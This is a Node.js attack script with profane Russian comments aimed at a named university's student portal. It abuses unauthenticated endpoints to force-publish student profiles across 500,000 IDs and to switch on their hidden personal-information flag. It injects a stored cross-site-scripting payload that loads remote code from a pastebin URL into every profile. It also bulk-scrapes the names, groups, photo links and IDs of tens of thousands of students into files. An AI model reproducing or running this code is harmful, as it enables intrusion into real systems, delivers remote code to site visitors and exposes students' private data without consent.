const fetch = require('node-fetch');
const needle = require('needle');
const async = require('async');
const iconv  = require('iconv-lite');
const jsdom = require('jsdom');
const { JSDOM } = jsdom;
const fs = require('fs');
const { promisify } = require('util');
const { performance } = require('perf_hooks');

const appendFileAsync = promisify(fs.appendFile)

////////////////////////////////////////////////////////////////////////////////////////
//Мердж нескольких файлов с информацией о студентах в один                            //
////////////////////////////////////////////////////////////////////////////////////////

let concatStudentsFiles = (outputPath, inputPaths) => {
	let students = [];
	let allNumber = 0;
	inputPaths.forEach(path => {
		let current = JSON.parse(fs.readFileSync(path, "utf8"));
		students = [...students, ...current];
		allNumber += current.length;
		console.log(`[${msToNiceTime(performance.now()-t0)}] ${current.length} students was loaded from ${path} file`);
	});
	//Самопальный юнион бай
	students = students.filter((item, pos) => students.findIndex(x => x.id === item.id) === pos);
	
	fs.writeFileSync(outputPath, JSON.stringify(students), (err) => {});
	console.log(`[${msToNiceTime(performance.now()-t0)}] [${students.length}/${allNumber}] students was saved to ${outputPath} file`);
}

////////////////////////////////////////////////////////////////////////////////////////
//Просто красивый вывод секундочек для логов в консольке o_0                          //
////////////////////////////////////////////////////////////////////////////////////////

let msToNiceTime = (ms) => {
    var seconds = Math.ceil(ms / 1000);
    var minutes = Math.floor(seconds / 60);
    var hours = "";
    if (minutes > 59) {
        hours = Math.floor(minutes / 60);
        hours = (hours >= 10) ? hours : "0" + hours;
        minutes = minutes - (hours * 60);
        minutes = (minutes >= 10) ? minutes : "0" + minutes;
    }

    seconds = Math.floor(seconds % 60);
    seconds = (seconds >= 10) ? seconds : "0" + seconds;
    if (hours != "") {
        return hours + ":" + minutes + ":" + seconds;
    }
    return minutes + ":" + seconds;
}

////////////////////////////////////////////////////////////////////////////////////////
//Получение информации о всех опубликованных анкетах текущих студентов.               //
//Пидорасы испортили мне скрапинг тем, что кодируют в 1251, фетч из 'node-fetch'      //
//тоже прихуел от такого поворота, он зачем-то ебашит все в utf8 по дефолту, так что  //
//от него тут я отказался в пользу needle, который говно, но с кодировками сам ебется.//
//Кстати, ты кто такой, зачем залез в мой исходник, сам дырки ищи, петух ебаный.      //
////////////////////////////////////////////////////////////////////////////////////////

let showPersonalInfoForAllActive = async (startStudNum, endStudNum, requestsCount) => {
    let parseDocument = async (body) => {
        return new JSDOM(body, 'text/html').window.document;
    }
	//Взлом пагинации, хуле, почему бы не возвращать 50к студентов в одном документе, 
	//думая при этом 10 минут над его составлением, мне же лучше, впрочем
	//Хотя нода чето не пережевала запрос по 50к, или их сервак чето охуел, поэтому 10 раз по 5
    let getStudents = async (count, page) => {let resp = await needle('post', 'https://kpfu.ru/studentu/main_page', 
			`p_sub=23861&p_rec_count=${count}&p_page=${page}&p_id=-1&p_period=&p_group_name=&p_text=&p_notes=`,
			{
				headers: {
					'Content-Type': 'application/x-www-form-urlencoded'
				}
			}
		);
		let body = resp.body;
		let doc = await parseDocument(body);
		let studentElements = [...doc.getElementsByClassName('li_spec')];
		if(studentElements.length === 1 && studentElements[0].textContent === 'Не найдено студентов по указанным Вами ФИО и/или подразделению.'){
			return [];
		}
		return studentElements
			.map(x => ({
				name: x.children[0].textContent, 
				link: x.children[0].href, 
				group: x.children[2].children[0].textContent.substring(8),
				universities: x.children[2].textContent.split('/').slice(0,-1).map(x => x.trim()),
				course: parseInt(x.children[2].textContent[x.children[2].textContent.lastIndexOf('(') + 1])
			}));
    }
	//Открыта ли допоплнительная информация, а также подсасывание ссылки на изображение
    let getStudentInfo = async (studentInfo) => {
		let resp = await needle('get', studentInfo.link);
        let doc = await parseDocument(resp.body);
        studentInfo.hasInfo = [...doc.getElementsByTagName('b')].filter(x => x.textContent === 'Дополнительные сведения').length === 1;
		studentInfo.imageSrc = [...doc.getElementsByTagName('img')].map(x => x.src).find(x => x.startsWith('https://shelly.kpfu.ru/e-ksu/docs/'));
        return await getMatchingStudents(studentInfo);
    }
	//Получение айдишника или undefined для студента с этим именем и группой, полных тезок из одной группы в очко
	let getMatchingStudents = async (studentInfo) => {
		//ЕБЛАНЫ ДВА РАЗА КОДИРУЮТ ИМЯ, ДОЛБОЕБЫ, ИЛИ ТАК ЗАДУМАНО?
		let encodedName = encodeURI(encodeURI(studentInfo.name));
		let resp = await needle('get', `https://shelly.kpfu.ru/e-ksu/knowledge_base.ajax_select2?q=${encodedName}`);
		//Я трайкэтчу только потому что там в жсоне у них сука вот два таких символа идет подряд: '\,'
		//Это при запросе у одного студика кривой жсон приходит. Код для проверки этого факта в консоли браузера, символ 188:
		//console.log(await(await fetch(`https://shelly.kpfu.ru/e-ksu/knowledge_base.ajax_select2?q=${encodeURI(encodeURI('Хакимова Гульшат Идвартовна'))}`)).text());
		let json = {};
		try{
			json = JSON.parse(resp.body);
		}
		catch{
			json = JSON.parse(resp.body.replace('\\', ''));
		}
		let students = json.items.filter(x => !x.name.includes('отчислен') && x.name.includes(studentInfo.group));
		studentInfo.id = students[0]?.id;
		return studentInfo;
	}
	//Вытаскивание студентиков
	let getAllStudents = async (startStudNum, endStudNum, requestsCount) => {
		let maxPageSize = 2500;
		let pageSize = maxPageSize;
		let startPage = Math.ceil(startStudNum/pageSize);
		let endPage = Math.ceil(endStudNum/pageSize);
		let pagesCount = endPage - startPage + 1;
				
		console.log(`Loading ${pageSize} students from each page from ${startPage} to ${endPage}`);
		
		let studentsWithPage = [];
		
		let firstPromise = getStudents(pageSize, startPage)
			.then(studs => {
				studs = studs.slice(startStudNum - (startPage - 1) * pageSize - 1);
				studentsWithPage = studentsWithPage.concat({page: startPage, students: studs});
				console.log(`[${msToNiceTime(performance.now()-t0)}] ${studs.length} students was loaded from ${startPage} page`);
			});
		
		
		let pages = Array.from(Array(pagesCount - 1), (x, i) => i + 1 + startPage);
		let secondPromise = async.mapLimit(pages, requestsCount, async (page) => {
			let studs = await getStudents(pageSize, page);
			studentsWithPage = studentsWithPage.concat({page: page, students: studs});
			console.log(`[${msToNiceTime(performance.now()-t0)}] ${studs.length} students was loaded from ${page} page`);
		});
		
		await Promise.all([firstPromise, secondPromise]);
		return [].concat.apply([], studentsWithPage.sort((x, y) => x.page - y.page).map(x => x.students));
	}
	//Получение студентов, запись в файл, и опциональное включение доп.инф, если выключена
	let main = async (startStudNum, endStudNum, requestsCount) => {
		t0 = performance.now();
		console.log(`Loading students from ${startStudNum} to ${endStudNum} to main array`);
		let students = await getAllStudents(startStudNum, endStudNum, requestsCount);
		console.log(`${students.length} students was successfully loaded to main array`);
		
		fs.writeFileSync(fileName, '[\n', (err) => {});
		let index = 1;
		t0 = performance.now();
		await async.mapLimit(students, requestsCount, async (studentBase) => {
			let studentInfo = await getStudentInfo(studentBase);
			let infoWithId = await getMatchingStudents(studentInfo);
			if(typeof infoWithId.id !== 'undefined' && !infoWithId.hasInfo){
				await showScript(infoWithId.id);
			}
			await appendFileAsync(fileName, `${JSON.stringify(infoWithId)},\n`, (err) => {});
			console.log(`[${msToNiceTime(performance.now()-t0)}][${index}/${students.length}|${(100*index/students.length).toFixed(2)}%] Info loaded:  ${infoWithId.name}`);
			index++;
		});
		console.log('Program was successfully finished');
		fs.truncateSync(fileName, fs.statSync(fileName)["size"] - 2);
		fs.appendFileSync(fileName, '\n]');
	}
	
	await main(startStudNum, endStudNum, requestsCount);
}

////////////////////////////////////////////////////////////////////////////////////////
//Запросики, которыми я хуярю по этому дерьмосайту                                    //
////////////////////////////////////////////////////////////////////////////////////////

//Опубликовать анкету
let postAnket = async (id) => {
    await fetch('https://shelly.kpfu.ru/e-ksu/IAS$DB.NEW_STUD_PERSONAL.PUB_STATUS', {
        method: 'POST',
        headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
        },
		body: `p_stud_id=${id}&p_value=1&p_type=web_permit`
    });
}
//Включить дополнительные сведения
let showScript = async (id) => {
    await fetch('https://shelly.kpfu.ru/e-ksu/IAS$DB.NEW_STUD_PERSONAL.PUB_STATUS', {
        method: 'POST',
        headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: `p_stud_id=${id}&p_field_id=4`
    });
}
//Внедрить скрипт
let postScript = async (id) => {
    await fetch('https://shelly.kpfu.ru/e-ksu/IAS$DB.NEW_STUD_PERSONAL.UPDATE_INLINE', {
        method: 'POST',
        headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
        },
	body: `p_type=comment&p_stud_id=${id}&p_comment_field2=${script}`
    });
}
//Открыть анкеты и внедрить скрипт всем студентам в интервале
let injectAllIds = async (idStart, idEnd, requestsCount) => {
	console.log(`Opening profiles and injecting script for students with id from ${idStart} to ${idEnd}`);
	let urlIds = Array.from(Array(idEnd - idStart + 1), (x, i) => idEnd - i);
	t0 = performance.now();
	await async.mapLimit(urlIds, requestsCount, async (id) => {
		await postAnket(id);
		await postScript(id);
		console.log(`[${msToNiceTime(performance.now()-t0)}] Current id: ${id}`);
	})
}

////////////////////////////////////////////////////////////////////////////////////////
//Исполняемые директивы.                                                              //
//Не рекомендуется использовать одновременно несколько директив.                      //
//Порядок выполнения для полного взлома жопы этого сайта состоит в том, чтобы сначала //
//открыть анкеты по всем айдишникам и внедрить скрипт (использовать 1 директиву).     //
//Затем благодаря тому, что анкеты открыты и скрипт внедрен, можно узнать, у кого     //
//выключена галочка на показ дополнительной информации, и включить ее, заодно скачав  //
//всю информацию студентов (использовать 2 директиву).                                //
//В случае ошибок с парсингом говеных данных с их сайта во втором пункте и падения    //
//программы необходимо сохранить полученный частичный файл в другом файле, исправив   //
//конец массива в конце файла в приемлимый JSON, далее нужно изменить номер первого   //
//студента в методе showPersonalInfoForAllActive в соответствии с тем, сколько было   //
//студентов успешно скачано, далее сами ебитесь, думайте почему ебнулся код, у меня   //
//было из-за управляющего символа в жсоне, криворучки из деканата не умеют печатать,  //
//далее после того, как вы уверены, что код отработает этот случай, запускайте опять, //
//после этого нужно использовать директиву 3 для объединения всех файлов в один.      //
////////////////////////////////////////////////////////////////////////////////////////

let t0 = performance.now();

////////////////////////////////////////////////////////////////////////////////////////
//1 Раскомментировать, чтобы открыть все анкеты всех студентов и внедрить скрипт      //
////////////////////////////////////////////////////////////////////////////////////////
/*
let script = '<script src=https://pastebin.com/raw/F6qkpSsF></script>';
injectAllIds(1, 500000, 4);
*/
////////////////////////////////////////////////////////////////////////////////////////

////////////////////////////////////////////////////////////////////////////////////////
//2 Раскомментировать, чтобы открыть дополнительную информацию всех текущих студентов //
////////////////////////////////////////////////////////////////////////////////////////
/*
let fileName = 'students.json';
showPersonalInfoForAllActive(1, 50000, 5);
*/
////////////////////////////////////////////////////////////////////////////////////////

////////////////////////////////////////////////////////////////////////////////////////
//3 Раскомментировать, чтобы смерджить несколько массивов студентов из файлов в один  //
//  без дупликатов, используется по воле случая при рандомных ошибках 2 метода        //
////////////////////////////////////////////////////////////////////////////////////////
/*
let outputPath = 'allStudents.json';
let inputPaths = ['students2.json', 'students3.json', 'students4.json'];
concatStudentsFiles(outputPath, inputPaths);
*/
////////////////////////////////////////////////////////////////////////////////////////